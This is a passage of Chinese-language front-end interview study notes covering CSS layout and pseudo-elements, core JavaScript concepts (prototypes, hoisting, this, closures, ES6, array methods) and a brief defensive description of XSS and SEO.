等)的单冒号写法。\nCSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。\nCSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头\n\n\n定义不同\n伪类即假的类，可以添加类来达到效果\n伪元素即假元素，需要通过添加元素才能达到效果\n\n\n总结:\n伪类和伪元素都是⽤来表示⽂档树以外的”元素”。\n伪类和伪元素分别⽤单冒号:和双冒号::来表示。\n伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，\n是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类\n伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。\n伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。\n伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。\n\n\n\n14、行内元素的margin 和 padding参考答案：\n\n水平方向：水平方向上，都有效；\n垂直方向：垂直方向上，都无效；（padding-top 和 padding-bottom 会显示出效果，但是高度不会撑开，不会对周围元素有影响）\n\n15、min-width&#x2F;max-width 和 min-height&#x2F;max-height 属性间的覆盖规则？参考答案：\n\nmax-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。\nmin-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；\n\n16、未知高度元素垂直居中、水平居中的实现方式有哪些？参考答案：\n1、绝对定位+css3 transform:translate(-50%，-50%)\n.wrap&#123;\n  position:relative;\n&#125;\n.child&#123;\n  position: absolute;\n  top:50%;\n  left:50%;\n  -webkit-transform:translate(-50%,-50%);\n&#125;\n\n2、css3 的flex布局\n.wrap&#123;\n  display:flex;\n  justify-content:center;\n&#125;\n.child&#123;\n  align-self:center;\n&#125;\n\n3、table布局\n&lt;div class=\"wrap\">\n   &lt;div class=\"child\">\n          &lt;div>sadgsdgasgd&lt;/div>\n   &lt;/div>\n&lt;/div>\n.wrap&#123;\n  display:table;\n  text-align:center;\n&#125;\n.child&#123;\n  background:#ccc;\n  display:table-cell;\n  vertical-align:middle;\n&#125;\n.child div&#123;\n    width:300px;\n    height:150px;\n    background:red;\n    margin:0 auto;\n&#125;\n\n\n\nJavascript1、JS中的instanceof运算符instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上\nobj instanceof Object;&#x2F;&#x2F;true 实例obj在不在Object构造函数中\n\neg：\n请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。\nfunction _instanceof(left,right) &#123;\n    &#x2F;&#x2F; 补全代码\n    return (left instanceof right )\n    \n&#125;\n\n2、排序sort() 方法对数组的项目进行排序。\n按升序对数组中的数字进行排序：\nvar points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return a-b&#125;);\n\n按降序对数组中的数字进行排序：\nvar points &#x3D; [40, 100, 1, 5, 25, 10];\npoints.sort(function(a, b)&#123;return b-a&#125;);\n\n3、JS字符串大写和小写之间的转换String 字符串大小写转换方法\n\n\n\n字符串方法\n说明\n\n\n\ntoLocaleLowerCase()\n把字符串转换成小写\n\n\ntoLocaleUpperCase()\n将字符串转换成大写\n\n\ntoLowerCase()\n将字符串转换成小写\n\n\ntoUpperCase()\n将字符串转换成大写\n\n\nvar s = \"JavaScript\";\nconsole.log(s.toUpperCase()); \n\n\n\n4、javascript如何删除指定数组元素\n使用delete关键字；\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;];\ndelete colors[0];\nconsole.log(colors); &#x2F;&#x2F; [undefined, &quot;blue&quot;, &quot;grey&quot;, &quot;green&quot;]\n\n\n使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了\n\n使用splice()操作方法；\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\nvar color &#x3D; colors.splice(0, 1);\nconsole.log(color); &#x2F;&#x2F; &quot;red&quot;\nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]\n\n在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。\n\n迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；\n第一种用最常见的ForEach循环来对比元素找到之后将其删除。\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\n\n \n\ncolors.forEach(function(item, index, arr) &#123;    if(item &#x3D;&#x3D;&#x3D; &quot;red&quot;) &#123;\n\n        arr.splice(index, 1);\n\n    &#125;\n\n&#125;)\n\nvar colors &#x3D; [&quot;red&quot;, &quot;blue&quot;, &quot;grey&quot;];\n\n \n\ncolors &#x3D; colors.filter(function(item) &#123;    return item !&#x3D; &quot;red&quot;&#125;);\n\n  \n\nconsole.log(colors); &#x2F;&#x2F; [&quot;blue&quot;, &quot;grey&quot;]\n\n\n\nprototype原型方法，在Array的原型上添加方法来达到删除的目的。\n\n\n5、数组方法数组方法概括\n\n\n方法名\n对应版本\n功能\n原数组是否改变\n\n\n\nconcat()\nES5-\n合并数组，并返回合并之后的数据\nn\n\n\njoin()\nES5-\n使用分隔符，将数组转为字符串并返回\nn\n\n\npop()\nES5-\n删除最后一位，并返回删除的数据\ny\n\n\nshift()\nES5-\n删除第一位，并返回删除的数据\ny\n\n\nunshift()\nES5-\n在第一位新增一或多个数据，返回长度\ny\n\n\npush()\nES5-\n在最后一位新增一或多个数据，返回长度\ny\n\n\nreverse()\nES5-\n反转数组，返回结果\ny\n\n\nslice()\nES5-\n截取指定位置的数组，并返回\nn\n\n\nsort()\nES5-\n排序（字符规则），返回结果\ny\n\n\nsplice()\nES5-\n删除指定位置，并替换，返回删除的数据\ny\n\n\ntoString()\nES5-\n直接转为字符串，并返回\nn\n\n\nvalueOf()\nES5-\n返回数组对象的原始值\nn\n\n\nindexOf()\nES5\n查询并返回数据的索引\nn\n\n\nlastIndexOf()\nES5\n反向查询并返回数据的索引\nn\n\n\nforEach()\nES5\n参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值\nn\n\n\nmap()\nES5\n同forEach，同时回调函数返回数据，组成新数组由map返回\nn\n\n\nfilter()\nES5\n同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回\nn\n\n\nevery()\nES5\n同forEach，同时回调函数返回布尔值，全部为true，由every返回true\nn\n\n\nsome()\nES5\n同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true\nn\n\n\nreduce()\nES5\n归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回\nn\n\n\nreduceRight()\nES5\n反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回\nn\n\n\n用slice(0)复制一个数组\na.splice(index,0,item)：在数组a的第index位置插入item\n最大值 ;Math.max.apply(Math,array)\n6、对象Number 对象Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：\nvar myNum &#x3D; new Number(value);\nvar myNum &#x3D; Number(value);\n\n其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。\neg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。\nfunction _numbertoobject(number) &#123;\n    &#x2F;&#x2F; 补全代码\n    var myNum &#x3D; new Number(number);\n    return myNum\n    \n&#125;\n\n对象字符串JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。\n创建 String 对象的语法格式如下：\nvar val &#x3D; new String(value);\nvar val &#x3D; String(value);\n\n\n\n\n\n\n\n\n\n\n\n\n\n对象属性遍历：\n使用 for in 循环遍历对象的属性时，原型链上的所有属性都将被访问：\nvar obj=&#123;\"name\":\"wjy\",\"age\":26,\"sex\":\"female\"&#125;;//定义一个object对象   \nvar keys=[];//定义一个数组用来接受key   \nvar values=[];//定义一个数组用来接受value   \n  for(var key in obj)&#123;   \n    keys.push(key);   \n    values.push(obj[key]);//取得value     \n    &#125;   \nalert(\"keys is ：\"+keys+\" and values is ：\"+values);  \n\n\n\nObject.keys(xx)&#x2F;Object.values(xx)\nconsole.log(Object.keys(obj));\nconsole.log(Object.values(obj));\n//输出：[\"name\", \"career\"]\n//输出：[ \"Poly\", \"it\"]\n\n添加属性//创建obj对象\n var obj = new Object();\n //为对象添加动态属性\n obj.userName = \"admin\";\n obj.passWord = \"123456\";\n //输出\n console.log(obj); \n\n删除对象属性//创建obj动态对象\nvar obj = new Object();\n//为对象添加动态属性\nobj.userName = \"admin\";\nobj.passWord = \"123456\";    \n//移除属性\ndelete obj.passWord;\nconsole.log(obj);\n\n\n\n7、字符串String 对象中的方法下表中列举了 String 对象中提供的方法及其描述信息：\n\n\n\n方法\n描述\n\n\n\nanchor()\n创建一个 HTML 锚点，即生成一个&lt;a&gt;标签，标签的 name 属性为 anchor() 方法中的参数\n\n\nbig()\n用大号字体显示字符串\n\n\nblink()\n显示闪动的字符串\n\n\nbold()\n使用粗体显示字符串\n\n\ncharAt()\n返回在指定位置的字符\n\n\ncharCodeAt()\n返回指定字符的 Unicode 编码\n\n\nconcat()\n拼接字符串\n\n\nfixed()\n以打字机文本显示字符串\n\n\nfontcolor()\n使用指定的颜色来显示字符串\n\n\nfontsize()\n使用指定的尺寸来显示字符串\n\n\nfromCharCode()\n将字符编码转换为一个字符串\n\n\nindexOf()\n检索字符串，获取给定字符串在字符串对象中首次出现的位置\n\n\nitalics()\n使用斜体显示字符串\n\n\nlastIndexOf()\n获取给定字符串在字符串对象中最后出现的位置\n\n\nlink()\n将字符串显示为链接\n\n\nlocaleCompare()\n返回一个数字，并使用该数字来表示字符串对象是大于、小于还是等于给定字符串\n\n\nmatch()\n根据正则表达式匹配字符串中的字符\n\n\nreplace()\n替换与正则表达式匹配的子字符串\n\n\nsearch()\n获取与正则表达式相匹配字符串首次出现的位置\n\n\nslice()\n截取字符串的片断，并将其返回\n\n\nsmall()\n使用小字号来显示字符串\n\n\nsplit()\n根据给定字符将字符串分割为字符串数组\n\n\nstrike()\n使用删除线来显示字符串\n\n\nsub()\n把字符串显示为下标\n\n\nsubstr()\n从指定索引位置截取指定长度的字符串\n\n\nsubstring()\n截取字符串中两个指定的索引之间的字符\n\n\nsup()\n把字符串显示为上标\n\n\ntoLocaleLowerCase()\n把字符串转换为小写\n\n\ntoLocaleUpperCase()\n把字符串转换为大写\n\n\ntoLowerCase()\n把字符串转换为小写\n\n\ntoUpperCase()\n把字符串转换为大写\n\n\ntoString()\n返回字符串\n\n\nvalueOf()\n返回某个字符串对象的原始值\n\n\n去除字符串左右两边的空格let str = \"   123   \";\nstr=str.trim(); // 123\n\n\n\n8、js 时间与时间戳的转换时间转时间戳：javascript获得时间戳的方法有四种，都是通过实例化时间对象 new Date() 来进一步获取当前的时间戳\nvar timetamp4 &#x3D; Number(new Date()) \n\n时间戳转时间function _date(number) &#123;\n  let date &#x3D; new Date(number);\n  let y &#x3D; date.getFullYear();\n  let m &#x3D; date.getMonth()+1;\n  let d &#x3D; date.getDate();\n  return (y + &quot;-&quot; + m + &quot;-&quot; + d);  \n&#125;\n\n9、Arguments 对象arguments 是一个对应于传递给函数的参数的类数组对象。\nfunction func1(a, b, c) &#123;\n  console.log(arguments[0]);\n  &#x2F;&#x2F; expected output: 1\n\n  console.log(arguments[1]);\n  &#x2F;&#x2F; expected output: 2\n\n  console.log(arguments[2]);\n  &#x2F;&#x2F; expected output: 3\n&#125;\n\nfunc1(1, 2, 3);\n\n\n\n10、Document 对象Document 对象属性和方法HTML文档中可以使用以下属性和方法:\n\n\n\n属性 &#x2F; 方法\n描述\n\n\n\ndocument.activeElement\n返回当前获取焦点元素\n\n\ndocument.addEventListener()\n向文档添加句柄\n\n\ndocument.adoptNode(node)\n从另外一个文档返回 adapded 节点到当前文档。\n\n\ndocument.anchors\n返回对文档中所有 Anchor 对象的引用。\n\n\ndocument.applets\n返回对文档中所有 Applet 对象的引用。注意: HTML5 已不支持  元素。\n\n\ndocument.baseURI\n返回文档的绝对基础 URI\n\n\ndocument.body\n返回文档的body元素\n\n\ndocument.close()\n关闭用 document.open() 方法打开的输出流，并显示选定的数据。\n\n\ndocument.cookie\n设置或返回与当前文档有关的所有 cookie。\n\n\ndocument.createAttribute()\n创建一个属性节点\n\n\ndocument.createComment()\ncreateComment() 方法可创建注释节点。\n\n\ndocument.createDocumentFragment()\n创建空的 DocumentFragment 对象，并返回此对象。\n\n\ndocument.createElement()\n创建元素节点。\n\n\ndocument.createTextNode()\n创建文本节点。\n\n\ndocument.doctype\n返回与文档相关的文档类型声明 (DTD)。\n\n\ndocument.documentElement\n返回文档的根节点\n\n\ndocument.documentMode\n返回用于通过浏览器渲染文档的模式\n\n\ndocument.documentURI\n设置或返回文档的位置\n\n\ndocument.domain\n返回当前文档的域名。\n\n\ndocument.domConfig\n已废弃。返回 normalizeDocument() 被调用时所使用的配置。\n\n\ndocument.embeds\n返回文档中所有嵌入的内容（embed）集合\n\n\ndocument.forms\n返回对文档中所有 Form 对象引用。\n\n\ndocument.getElementsByClassName()\n返回文档中所有指定类名的元素集合，作为 NodeList 对象。\n\n\ndocument.getElementById()\n返回对拥有指定 id 的第一个对象的引用。\n\n\ndocument.getElementsByName()\n返回带有指定名称的对象集合。\n\n\ndocument.getElementsByTagName()\n返回带有指定标签名的对象集合。\n\n\ndocument.images\n返回对文档中所有 Image 对象引用。\n\n\ndocument.implementation\n返回处理该文档的 DOMImplementation 对象。\n\n\ndocument.importNode()\n把一个节点从另一个文档复制到该文档以便应用。\n\n\ndocument.inputEncoding\n返回用于文档的编码方式（在解析时）。\n\n\ndocument.lastModified\n返回文档被最后修改的日期和时间。\n\n\ndocument.links\n返回对文档中所有 Area 和 Link 对象引用。\n\n\ndocument.normalize()\n删除空文本节点，并连接相邻节点\n\n\ndocument.normalizeDocument()\n删除空文本节点，并连接相邻节点的\n\n\ndocument.open()\n打开一个流，以收集来自任何 document.write() 或 document.writeln() 方法的输出。\n\n\ndocument.querySelector()\n返回文档中匹配指定的CSS选择器的第一元素\n\n\ndocument.querySelectorAll()\ndocument.querySelectorAll() 是 HTML5中引入的新方法，返回文档中匹配的CSS选择器的所有元素节点列表\n\n\ndocument.readyState\n返回文档状态 (载入中……)\n\n\ndocument.referrer\n返回载入当前文档的文档的 URL。\n\n\ndocument.removeEventListener()\n移除文档中的事件句柄(由 addEventListener() 方法添加)\n\n\ndocument.renameNode()\n重命名元素或者属性节点。\n\n\ndocument.scripts\n返回页面中所有脚本的集合。\n\n\ndocument.strictErrorChecking\n设置或返回是否强制进行错误检查。\n\n\ndocument.title\n返回当前文档的标题。\n\n\ndocument.URL\n返回文档完整的URL\n\n\ndocument.write()\n向文档写 HTML 表达式 或 JavaScript 代码。\n\n\ndocument.writeln()\n等同于 write() 方法，不同的是在每个表达式之后写一个换行符。\n\n\n11、JS中阻止冒泡事件冒泡事件：比如说鼠标点击了一个按钮，同样的事件将会在那个元素的所有祖先元素中被触发。这一过程被称为事件冒泡。\n&lt;div class=\"box\">\n\t&lt;button class=\"btn\">按钮&lt;/button>\n&lt;/div>\n\n&lt;script type=\"text/javascript\">\n\t$('.btn').click(function () &#123;\n\t\talert('按钮被点击了')\n\t&#125;);\n\t$('.box').click(function () &#123;\n\t\talert('box被点击了')\n\t&#125;)\n&lt;/script>\n\n当我们点击按钮后，因为按钮也属于.box元素，所以按钮的父元素.box也会触发点击事件\n$('.btn').click(function (even) &#123;\n\teven.stopPropagation();\n\talert('按钮被点击了');\n&#125;)\n\n\n12、阻止默认事件&lt;a href&#x3D;&quot;javascript:;&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;a href&#x3D;&quot;javascript:void(0);&quot;&gt;链接&lt;&#x2F;a&gt;\n\n\n\n\n&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n        document.getElementById(&quot;link&quot;).onclick &#x3D; function ()&#123;\n            console.log(&quot;666&quot;);\n            return false;\n        &#125;\n&lt;&#x2F;script&gt;\n\n\n\n\n&lt;a href&#x3D;&quot;&quot; id&#x3D;&quot;link&quot;&gt;链接&lt;&#x2F;a&gt;\n\n&lt;script&gt;\n    document.getElementById(&quot;link&quot;).onclick &#x3D; function (e)&#123;\n        console.log(&quot;666&quot;);\n        e.preventDefault();\n    &#125;\n&lt;&#x2F;script&gt;\n\n\n\n\n13、window.locationLocation 对象属性\n\n\n属性\n描述\n\n\n\nhash\n设置或返回从井号 (#) 开始的 URL（锚）。\n\n\nhost\n设置或返回主机名和当前 URL 的端口号。\n\n\nhostname\n设置或返回当前 URL 的主机名。\n\n\nhref\n设置或返回完整的 URL。\n\n\npathname\n设置或返回当前 URL 的路径部分。\n\n\nport\n设置或返回当前 URL 的端口号。\n\n\nprotocol\n设置或返回当前 URL 的协议。\n\n\nsearch\n设置或返回从问号 (?) 开始的 URL（查询部分）。\n\n\nLocation 对象方法\n\n\n属性\n描述\n\n\n\nassign()\n加载新的文档。\n\n\nreload()\n重新加载当前文档。\n\n\nreplace()\n用新的文档替换当前文档。\n\n\n14、原型与原型链原型 prototype原型是函数特有\n&lt;script>\n     function fu()&#123;\n\n     &#125;\n     fu.prototype.name = 'kif'\n     console.log(fu.prototype.name)\n &lt;/script>\n\n挂载在原型上是为了继承(通过new)\n\n\n继承后查找时就近，\n判断属性时继承的还是后天添加的：hasOwnProperty\n\n可以拿到p1的私有属性\n这个方法既不是Persion也不是p1的，而是Persion继承自Object的\n\n\n原型链：_proto_对象，数组，函数等有原型链\n\n预编译function fn(a,c)&#123;\n\tconsole.log(a)\n\tvar a =123;\n\tconsole.log(a)\n\tconsole.log(c)\n\tfunction a()&#123;&#125;\n\tif(false)&#123;\n\t\tvar  d =678\n\t&#125;\n\tconsole.log(d)\n\tconsole.log(b)\n\tvar b =function()&#123;&#125;\n\tconsole.log(b)\n\tfunction c()&#123;&#125;\n\tconsole.log(c)\n&#125;\nfn(2,3)\n\n\n\n 预编译步骤：\n\n创建AO对象\nAO：&#123;\n\n&#125;\n\n\n\n找形参和变量声明\nAO：&#123;\n\ta:undefind\n\tc:undefind\n\td:undefind\n\tbLundefind\n&#125;\n\n\n\n实参与形参相统一\nAO：&#123;\n\ta:2\n\tc:3\n\td:undefind\n\tb:undefind\n&#125;\n\n\n\n找函数申明（会覆盖变量）\nAO：&#123;\n\ta:function a()&#123;&#125;\n\tc:function c()&#123;&#125;\n\td:undefind\n\tb:undefind\n&#125;\n\n注:var b &#x3D;function(){}不是函数声明\n\n逐行执行\nfunction fn(a,c)&#123;\n\tconsole.log(a)&#x2F;&#x2F;function a()&#123;&#125;\n\tvar a &#x3D;123;\n\tconsole.log(a)&#x2F;&#x2F;123\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n\tfunction a()&#123;&#125;\n\tif(false)&#123;\n\t\tvar  d &#x3D;678\n\t&#125;\n\tconsole.log(d)&#x2F;&#x2F;undefind\n\tconsole.log(b)&#x2F;&#x2F;undefind\n\tvar b &#x3D;function()&#123;&#125;\n\tconsole.log(b)&#x2F;&#x2F;function()&#123;&#125;\n\tfunction c()&#123;&#125;\n\tconsole.log(c)&#x2F;&#x2F;function c()&#123;&#125;\n&#125;\nfn(2,3)\n\n\n\n\n\n\n15、this函数直接调用function get(a)&#123;\n    console.log(a)\n&#125;\nget(&#39;kif&#39;)\n\n\n其中 get(‘kif’) 其实是get.call(window,’kif’ )\n\n即：对象.方法.call(对象，参数)\n对象方法var Persion = &#123;\n    name: 'kif',\n    getName: function (time) &#123;\n        console.log(this.name,time)\n    &#125;\n&#125;\nPersion.getName(299)\n\n\n同理：\nPersion.getName(299)为：Persion.getName.call(Persion,299)\n\n案例：var name = 222\nvar a=&#123;\n    name :111,\n    say:function()&#123;\n        console.log(this.name)\n    &#125;\n&#125;\nvar fun = a.say\nfun()//fun.call(window,)======>222\na.say()//a.say.call(a,)=======>111\nvar b =&#123;\n    name:333,\n    say:function(fun)&#123;\n        fun()//fun.call(window,)//222\n    &#125;\n&#125;\nb.say(a.say)//\nb.say=a.say\nb.say()//b.say.call(b,)=======>333\n\n箭头函数中thisvar x =11\nvar p =&#123;\n    x:22,\n    say:()=>&#123;\n        console.log(this.x)\n    &#125;\n&#125;\np.say()\n\n箭头函数中this固定指向代码块外部\n\nthis指向（普通函数、箭头函数）参考答案：\n普通函数中的this\n\n谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁\n\nlet getThis = function () &#123;\n    console.log(this);\n&#125;\n\nlet obj=&#123;\n    name:\"Jack\",\n    getThis:function()&#123;\n        console.log(this);\n    &#125;\n&#125;\n//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window\ngetThis();//window\n//此处的getThis()方法是obj这个对象调用的，所以this指向obj\nobj.getThis();//obj\n\n\n匿名函数中的this：匿名函数的执行具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象；\n\nlet obj = &#123;\n    getThis: function () &#123;\n        return function () &#123;\n            console.log(this);\n        &#125;\n    &#125;\n&#125;\nobj.getThis()(); //window\n\n上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)：\nlet obj = &#123;\n     getThis: function () &#123;\n     //提前保存this指向\n         let _this=this\n         return function () &#123;\n             console.log(_this);\n         &#125;\n     &#125;\n &#125;\n obj.getThis()(); //obj\n\n\n箭头函数中的this\n箭头函数中的this是在函数定义的时候就确定下来的，而不是在函数调用的时候确定的；\n箭头函数中的this指向父级作用域的执行上下文；（技巧：因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this）\n箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来。\n\n\n\n例1：首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。\nlet obj = &#123;\n    //此处的this即是箭头函数中的this\n    getThis: function () &#123;\n        return  ()=> &#123;\n            console.log(this);\n        &#125;\n    &#125;\n&#125;\nobj.getThis()(); //obj\n\n例2：该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window。\n复制代码\n //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。\nlet obj = &#123;\n     getThis: ()=> &#123;\n         return  ()=> &#123;\n             console.log(this);\n         &#125;\n     &#125;\n &#125;\n obj.getThis()(); //window\n\n\n\n\n\n16、闭包形式：方法里面返回一个方法\nfunction a() &#123;\n        let a = 1;\n        return function () &#123;\n          return a;\n        &#125;;\n      &#125;\n\n\n\n意义：\n延长变量生命周期\n创建私有环境\n\nVue中data也是一个闭包\ndata（）&#123;\n\treturn&#123;\n\t\n\t&#125;\n&#125;\n\n会常驻内存，所以慎用\n17、ES6var let constvar:\n变量提升\nconsole.log(a)//undefined\nvar a = 12\n\n\n\n变量覆盖\nvar a =12\nvar a =23\nconsole.log(a)//23\n\n\n\n没有块级作用域\nfunction fu()&#123;\n\tfor(var i=0;i&lt;3;i++)&#123;\n\t\tconsole.log(i)\n\t&#125;\n\tconsole.log(i)//3\n&#125;\n\nconst:\nconst声明之后必须赋值\n\nconst定义数组，可以对数组修改\nconst arr = [\"sad\", \"666\", \"qewqe\"];\narr.push('5465')\nconsole.log(arr)\n\n解构let a&#x3D;1;\nlet b &#x3D;2;\n\n\n不使用第三个变量互换值\n[a,b]&#x3D;[b,a]\n\n去重let arr=[1,2,3,4,5,2,3,4,2]\nlet ans = [...new Set(arr)]\nconsole.log(ans)\n\npromiselet p = new Promise((resolve, reject) => &#123;\n    console.log(1)\n    resolve()\n    console.log(2)\n&#125;)\np.then(() => &#123;\n    console.log(3)\n&#125;)\nconsole.log(4)\n\n\n构造函数同步执行   &#x2F;&#x2F;1,2\n异步函数异步执行 &#x2F;&#x2F;4,3\n\n18、xssxss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；\n19、SEOSEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。\n20、数组去重ES6：\nlet  arr = [12, 12, 3, 2, 23, 23, 4, 3, 2];\n\nfunction unique(arr) &#123;\n  return Array.from(new Set(arr));\n&#125;\nconsole.log(unique(arr));\n\n\nlet arr = [12, 12, 34, 21, 34, 21, 5, 2, 5];\nfunction unique(arr) &#123;\n  return [...new Set(arr)];\n&#125;\nconsole.log(unique(arr));\n\n\n\n\nES5：\nlet arr = [12, 12, 3, 4, 4, 3, 5, 23, 12, 3];\nfunction unique(arr) &#123;\n  let Newarr = [];\n  for (let i = 0; i &lt; arr.length; i++) &#123;\n    if (Newarr.indexOf(arr[i]) == -1) &#123;\n      Newarr.push(arr[i]);\n    &#125;\n  &#125;\n  return Newarr;\n&#125;\nconsole.log(unique(arr));\n\n\n\n\n21、数组和伪数组的区别\n定义\n\n\n数组是一个特殊对象,与常规对象的区别：\n当由新元素添加到列表中时，自动更新length属性\n设置length属性，可以截断数组\n从Array.protoype中继承了方法\n属性为’Array’\n\n\n类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。\n\n\n区别本质：类数组是简单对象，它的原型关系与数组不同。\n\n// 原型关系和原始值转换\nlet arrayLike = &#123;\n    length: 10,\n&#125;;\nconsole.log(arrayLike instanceof Array); // false\nconsole.log(arrayLike.__proto__.constructor === Array); // false\nconsole.log(arrayLike.toString()); // [object Object]\nconsole.log(arrayLike.valueOf()); // &#123;length: 10&#125;\n\nlet array = [];\nconsole.log(array instanceof Array); // true\nconsole.log(array.__proto__.constructor === Array); // true\nconsole.log(array.toString()); // ''\nconsole.log(array.valueOf()); // []\n\n\n类数组转换为数组\n\n\n转换方法\n使用 Array.from()\n使用 Array.prototype.slice.call()\n使用 Array.prototype.forEach() 进行属性遍历并组成新的数组\n\n\n转换须知\n转换后的数组长度由 length 属性决定。索引不连续时转换结果是连续的，会自动补位。\n代码示例\n\n\n\nlet al1 = &#123;\n    length: 4,\n    0: 0,\n    1: 1,\n    3: 3,\n    4: 4,\n    5: 5,\n&#125;;\nconsole.log(Array.from(al1)) // [0, 1, undefined, 3]\n\n\n②仅考虑 0或正整数 的索引\n\n// 代码示例\nlet al2 = &#123;\n    length: 4,\n    '-1': -1,\n    '0': 0,\n    a: 'a',\n    1: 1\n&#125;;\nconsole.log(Array.from(al2)); // [0, 1, undefined, undefined]\n\n\n③使用slice转换产生稀疏数组\n\n// 代码示例\nlet al2 = &#123;\n    length: 4,\n    '-1': -1,\n    '0': 0,\n    a: 'a',\n    1: 1\n&#125;;\nconsole.log(Array.prototype.slice.call(al2)); //[0, 1, empty × 2]\n\n\n使用数组方法操作类数组注意地方\n\n复制代码\nlet arrayLike2 = &#123;\n  2: 3,\n  3: 4,\n  length: 2,\n  push: Array.prototype.push\n&#125;\n\n// push 操作的是索引值为 length 的位置\narrayLike2.push(1);\nconsole.log(arrayLike2); // &#123;2: 1, 3: 4, length: 3, push: ƒ&#125;\narrayLike2.push(2);\nconsole.log(arrayLike2); // &#123;2: 1, 3: 2, length: 4, push: ƒ&#125;\n\n\n\n\n\n22、手写一个发布订阅// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;\ninterface CacheProps &#123;\n  [key: string]: Array&lt;((data?: unknown) => void)>;\n&#125;\n\nclass Observer &#123;\n  private caches: CacheProps = &#123;&#125;; // 事件中心\n  on (eventName: string, fn: (data?: unknown) => void)&#123; // eventName事件名-独一无二, fn订阅后执行的自定义行为\n    this.caches[eventName] = this.caches[eventName] || [];\n    this.caches[eventName].push(fn);\n  &#125;\n\n  emit (eventName: string, data?: unknown) &#123; // 发布 => 将订阅的事件进行统一执行\n    if (this.caches[eventName]) &#123;\n      this.caches[eventName].forEach((fn: (data?: unknown) => void) => fn(data));\n    &#125;\n  &#125;\n\n  off (eventName: string, fn?: (data?: unknown) => void) &#123; // 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息\n    if (this.caches[eventName]) &#123;\n      const newCaches = fn ? this.caches[eventName].filter(e => e !== fn) : [];\n      this.caches[eventName] = newCaches;\n    &#125;\n  &#125;\n\n&#125;\n\n\n\n\n\n\n\n23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？参考答案：\nSet\n\n成员不能重复；\n只有键值，没有键名，有点类似数组；\n可以遍历，方法有 add、delete、has\n\nWeakSet\n\n成员都是对象（引用）；\n成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；\n不能遍历，方法有 